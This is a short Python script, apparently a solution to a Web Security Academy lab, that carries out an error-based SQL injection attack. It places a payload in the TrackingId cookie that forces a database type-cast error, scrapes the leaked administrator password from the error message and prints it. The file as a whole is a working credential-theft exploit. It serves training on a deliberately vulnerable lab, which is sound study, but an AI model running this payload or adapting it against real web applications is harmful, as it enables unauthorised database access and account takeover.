import sys
import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter, Retry



def get_admin_password(url, session):
    try:
        payload = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
        response = session.get(url, cookies={"TrackingId": payload}, timeout=10)

        # Extracting password from response
        soup = BeautifulSoup(response.text, "html.parser")
        password = soup.find("p", class_="is-warning").text.split('"')[1]
        return password


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")
        sys.exit(1)

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")
        sys.exit(1)

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].rstrip("/")
    session = requests.Session()
    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

    admin_password = get_admin_password(url, session)
    if admin_password:
        print(f"(+) Administrator account password: {admin_password}")
    else:
        print("(-) Administrator password not found.")



if __name__ == "__main__":
    main()
